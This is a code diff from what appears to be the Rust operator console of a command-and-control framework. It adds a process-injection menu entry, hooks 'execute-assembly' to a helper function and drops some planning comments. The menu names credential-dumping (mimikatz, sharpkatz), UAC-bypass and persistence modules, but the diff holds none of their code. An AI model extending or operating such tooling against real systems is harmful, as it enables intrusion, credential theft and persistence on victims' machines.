@@ -136,6 +136,7 @@ fn links_menu_help() {
     println!("  persist             persistence modules");
     println!("  bypass-uac          bypass UAC");
     println!("  mimikatz            ala mimikatz");
+    println!("  psinject            process injection");
     println!("  sharpkatz           ala sharpkatz");
     println!("  sassykitdi          ala sassykitdi");
     println!("  cmd                 execute command directly from process");
@@ -204,18 +205,14 @@ fn links_loop(links: web::Data<Links>, args: Vec<String>) {
                 rl.add_history_entry(line.as_str());
 				args = get_string_vec(line);
 				match args[0].as_str() {
-                    // use sliver approach
-                    // HostingCLR DLL
-                    "execute-assembly"  => println!("todo"),
+                    "execute-assembly"  => util::nonstd::execute_assembly(links.clone(), link_index, args),
                     "execute-pe"        => println!("todo"),
                     "powerpick"         => println!("todo"),
                     // have pre generated DLLs for dropping
                     // teams and other programs commonly used
                     // junction folders, startup and registry
                     "persist"           => println!("todo"),
-                    // use Apollo method, add others as well
                     "bypass-uac"        => println!("todo"),
-                    // for now just use powershell
                     "psinject"          => util::nonstd::process_inject(links.clone(), link_index, args),
                     "mimikatz"          => link_command(links.clone(), link_index, args),
                     "sharpkatz"         => println!("todo"),
@@ -262,7 +259,7 @@ fn link_command(links: web::Data<Links>, link_index: usize, command: Vec<String>
             return
         }
     }
-    links.links.lock().unwrap()[link_index].set_command(command.join(" "));
+    links.links.lock().unwrap()[link_index].set_command(command.join(" "), command.join(" "));
 }
 
 fn links_list(links: web::Data<Links>) {
